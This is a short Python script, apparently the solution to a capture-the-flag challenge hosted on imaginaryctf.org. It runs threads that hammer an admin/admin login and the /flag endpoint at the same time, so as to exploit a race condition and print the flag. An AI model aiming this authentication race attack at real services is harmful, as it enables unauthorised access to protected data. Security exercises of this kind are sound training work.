import requests
from threading import Thread

url = "https://pwning-en-logique-8656e5e916dbf692.d.imaginaryctf.org"

# r = requests.post(
#     f"{url}/login",
#     allow_redirects=False,
#     data={
#         "username": "guest",
#         "password": "guest"
#     } 
# )

# cookies = r.cookies.get_dict()

def go1(): 
    for _ in range(100):
        r = requests.post(
            f"{url}/login",
            data={
                "username": "admin",
                "password": "admin"
            } 
        )
        # assert r.status_code == 200 

def go2():
    for _ in range(100):
        r = requests.get(
            f"{url}/flag",
        )
        print(r.text) 

threads = [ ]
for _ in range(5):
    thr = Thread(target=go1) 
    threads.append(thr) 
    thr = Thread(target=go2) 
    threads.append(thr) 

for thr in threads: 
    thr.start() 

for thr in threads: 
    thr.join() 

